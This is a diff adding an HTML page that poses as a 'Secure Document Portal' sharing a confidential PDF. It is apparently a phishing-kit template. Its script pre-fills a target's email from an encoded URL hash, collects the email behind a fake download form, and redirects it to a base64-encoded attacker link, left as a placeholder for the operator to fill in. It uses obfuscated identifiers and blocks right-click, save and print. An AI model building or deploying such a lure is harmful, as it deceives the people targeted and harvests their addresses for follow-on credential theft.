@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.tailwindcss.com https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com https://readdy.ai data:; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://readdy.ai;">
+<title>Confidential Document Shared</title>
+<script src="https://cdn.tailwindcss.com/3.4.16"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        primary: '#3b82f6',
+        secondary: '#1d4ed8',
+        glass: 'rgba(255, 255, 255, 0.1)',
+        'glass-border': 'rgba(255, 255, 255, 0.2)'
+      },
+      borderRadius: {
+        'none': '0px',
+        'sm': '4px',
+        DEFAULT: '8px',
+        'md': '12px',
+        'lg': '16px',
+        'xl': '20px',
+        '2xl': '24px',
+        '3xl': '32px',
+        'full': '9999px',
+        'button': '8px'
+      },
+      backdropBlur: {
+        xs: '2px',
+      },
+      boxShadow: {
+        'glass': '0 8px 32px 0 rgba(31, 38, 135, 0.37)',
+        'inner-glow': 'inset 0 0 20px rgba(255, 255, 255, 0.1)'
+      }
+    }
+  }
+}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
+<style>
+* {
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+  min-height: 100vh;
+  position: relative;
+  overflow-x: hidden;
+}
+
+body::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+    radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+    radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
+  z-index: -1;
+}
+
+.glass-panel {
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+}
+
+.glass-button {
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  transition: all 0.3s ease;
+}
+
+.glass-button:hover {
+  background: rgba(255, 255, 255, 0.2);
+  transform: translateY(-2px);
+  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+}
+
+.glass-input {
+  background: rgba(255, 255, 255, 0.05);
+  backdrop-filter: blur(5px);
+  -webkit-backdrop-filter: blur(5px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  transition: all 0.3s ease;
+}
+
+.glass-input:focus {
+  background: rgba(255, 255, 255, 0.1);
+  border-color: rgba(255, 255, 255, 0.4);
+  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+}
+
+.document-icon {
+  position: relative;
+  width: 80px;
+  height: 100px;
+  background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(255, 255, 255, 0.05));
+  border-radius: 8px;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  box-shadow: 
+    inset 0 0 20px rgba(255, 255, 255, 0.1),
+    0 5px 15px rgba(0, 0, 0, 0.2);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  overflow: hidden;
+}
+
+.document-icon::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 20px;
+  height: 20px;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 0 0 0 8px;
+}
+
+.document-icon::after {
+  content: "";
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 0;
+  height: 0;
+  border-style: solid;
+  border-width: 0 20px 20px 0;
+  border-color: transparent rgba(255, 255, 255, 0.2) transparent transparent;
+}
+
+.document-text {
+  font-size: 14px;
+  color: #fff;
+  font-weight: bold;
+  margin-top: 5px;
+  text-align: center;
+  text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+}
+
+.document-extension {
+  font-size: 10px;
+  color: rgba(255, 255, 255, 0.7);
+  text-transform: uppercase;
+  margin-top: 2px;
+}
+
+.custom-checkbox {
+  appearance: none;
+  -webkit-appearance: none;
+  width: 20px;
+  height: 20px;
+  border: 2px solid rgba(255, 255, 255, 0.5);
+  border-radius: 4px;
+  outline: none;
+  cursor: pointer;
+  position: relative;
+  background: rgba(255, 255, 255, 0.05);
+  transition: all 0.3s ease;
+}
+
+.custom-checkbox:checked {
+  background-color: #3b82f6;
+  border-color: #3b82f6;
+}
+
+.custom-checkbox:checked::after {
+  content: "";
+  position: absolute;
+  top: 3px;
+  left: 6px;
+  width: 6px;
+  height: 10px;
+  border: solid white;
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+
+.loading-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.7);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  backdrop-filter: blur(5px);
+}
+
+.security-badge {
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  padding: 8px 16px;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 0.75rem;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px); }
+  50% { transform: translateY(-10px); }
+}
+
+@keyframes fadeIn {
+  0% { opacity: 0; transform: translateY(20px); }
+  100% { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes shimmer {
+  0% { background-position: -200% 0; }
+  100% { background-position: 200% 0; }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.animate-float {
+  animation: float 6s ease-in-out infinite;
+}
+
+.animate-fadeIn {
+  animation: fadeIn 0.8s ease-out;
+}
+
+.animate-shimmer {
+  background: linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,0.2), rgba(255,255,255,0));
+  background-size: 200% 100%;
+  animation: shimmer 2s infinite;
+}
+
+.animate-spin {
+  animation: spin 1s linear infinite;
+}
+
+.particle {
+  position: absolute;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.1);
+  pointer-events: none;
+  z-index: -1;
+}
+
+.expiry-timer {
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  padding: 4px 12px;
+  font-size: 0.75rem;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.gradient-text {
+  background: linear-gradient(135deg, #fff 0%, #a5b4fc 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+</style>
+</head>
+<body oncontextmenu="return false">
+<div class="loading-overlay animate-fadeIn" id="loadingOverlay">
+  <div class="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+</div>
+
+<!-- Background Particles -->
+<div id="particles-container"></div>
+
+<header class="py-6 px-4">
+  <div class="max-w-4xl mx-auto flex items-center justify-between">
+    <div class="w-12 h-12 rounded-full glass-button flex items-center justify-center">
+      <i class="ri-lock-line text-white text-xl"></i>
+    </div>
+    <h1 class="text-2xl md:text-3xl font-bold text-center gradient-text">Confidential Document Shared</h1>
+    <div class="w-12 h-12 rounded-full glass-button flex items-center justify-center">
+      <i class="ri-shield-check-line text-white text-xl"></i>
+    </div>
+  </div>
+</header>
+
+<main class="py-8 px-4 animate-fadeIn">
+  <div class="max-w-md mx-auto glass-panel rounded-xl p-6 md:p-8">
+    <div class="mb-6 text-center">
+      <div class="document-icon mb-4 animate-float">
+        <div class="document-text">PDF</div>
+        <div class="document-extension">file</div>
+      </div>
+      <h2 class="text-xl font-semibold text-white mb-2">Shared Document 102982892983.pdf</h2>
+      <p class="text-sm text-gray-300 mb-3">Confidential document • 18 MB</p>
+      <div class="security-badge">
+        <i class="ri-shield-keyhole-line"></i>
+        <span>Encrypted & Secure</span>
+      </div>
+    </div>
+    
+    <div class="border-t border-b border-gray-200/20 py-4 my-4">
+      <p class="text-sm text-gray-300 mb-4 text-center">This document contains sensitive information. Please verify your email to access.</p>
+      
+      <form id="downloadForm" class="space-y-4">
+        <div>
+          <label for="email" class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+          <div class="relative">
+            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+              <i class="ri-mail-line text-gray-400 text-lg"></i>
+            </div>
+            <input type="email" id="email" name="email" class="w-full pl-10 pr-3 py-3 glass-input rounded-lg focus:outline-none text-white placeholder-gray-400" placeholder="Enter your email address" required>
+          </div>
+        </div>
+        
+        <div class="flex items-start">
+          <input type="checkbox" id="terms" name="terms" class="custom-checkbox mt-1" required>
+          <label for="terms" class="ml-3 block text-sm text-gray-300">
+            I acknowledge that this document is confidential and agree to the terms of use
+          </label>
+        </div>
+        
+        <button type="submit" class="w-full flex items-center justify-center py-3 px-4 bg-primary hover:bg-primary/90 text-white font-medium rounded-button transition-colors duration-200 glass-button">
+          <i class="ri-download-line mr-2 text-lg"></i>
+          Download Document
+        </button>
+      </form>
+    </div>
+    
+    <div class="text-center">
+      <div class="expiry-timer text-gray-300 mb-4">
+        <i class="ri-time-line"></i>
+        <span>Document will expire in 7 days</span>
+      </div>
+      
+      <div class="flex items-center justify-center space-x-4">
+        <div class="w-10 h-10 flex items-center justify-center rounded-full glass-button">
+          <i class="ri-lock-line text-white"></i>
+        </div>
+        <div class="w-10 h-10 flex items-center justify-center rounded-full glass-button">
+          <i class="ri-eye-off-line text-white"></i>
+        </div>
+        <div class="w-10 h-10 flex items-center justify-center rounded-full glass-button">
+          <i class="ri-shield-check-line text-white"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="py-6 text-center">
+  <p class="text-xs text-gray-400">© 2025 Secure Document Portal. All rights reserved.</p>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Create background particles
+  createParticles();
+  
+  // Function to generate random number
+  function _0x3764(length = 5) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+  }
+  
+  var tenHag = _0x3764();
+  
+  // Extract email from URL hash if present
+  const hash = window.location.hash.substring(1);
+  if (hash) {
+    try {
+      // Try normal decoding first
+      let email = decodeURIComponent(hash);
+      // If that doesn't look like an email, try base64
+      if (!email.includes('@')) {
+        email = atob(hash);
+      }
+      if (email.includes('@')) {
+        document.getElementById('email').value = email;
+      }
+    } catch (e) {
+      console.error('Failed to decode hash');
+    }
+  }
+  
+  // Form submission handler
+  document.getElementById('downloadForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const emailInput = document.getElementById('email');
+    const email = emailInput.value.trim();
+    
+    if (!email || !email.includes('@')) {
+      emailInput.classList.add('border-red-500');
+      return;
+    }
+    
+    document.getElementById('loadingOverlay').style.display = 'flex';
+    
+    // Create FormData object
+    const formData = new FormData();
+    formData.append('email', email);
+    formData.append('domain', window.location.hostname);
+    
+    var codU = 'aHR0cHM6Ly9leGFtcGxlLmNvbS8/aWQ9'; // Put your base64 link here
+    var dcodU = atob(codU);
+    var codeU = email;
+    
+    // Simulate form submission and redirect
+    setTimeout(function() {
+      // Redirect with email as hash
+      window.location.href = `${dcodU}${codeU}`;
+    }, 1500);
+  });
+  
+  // Create floating particles in background
+  function createParticles() {
+    const container = document.getElementById('particles-container');
+    const particleCount = 15;
+    
+    for (let i = 0; i < particleCount; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      
+      // Random size and position
+      const size = Math.random() * 60 + 20;
+      const posX = Math.random() * 100;
+      const posY = Math.random() * 100;
+      
+      particle.style.width = `${size}px`;
+      particle.style.height = `${size}px`;
+      particle.style.left = `${posX}%`;
+      particle.style.top = `${posY}%`;
+      
+      // Random animation
+      const duration = Math.random() * 20 + 10;
+      const delay = Math.random() * 5;
+      particle.style.animation = `float ${duration}s ease-in-out ${delay}s infinite`;
+      
+      container.appendChild(particle);
+    }
+  }
+});
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+  if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
+    e.preventDefault();
+  }
+});
+</script>
+</body>
+</html>
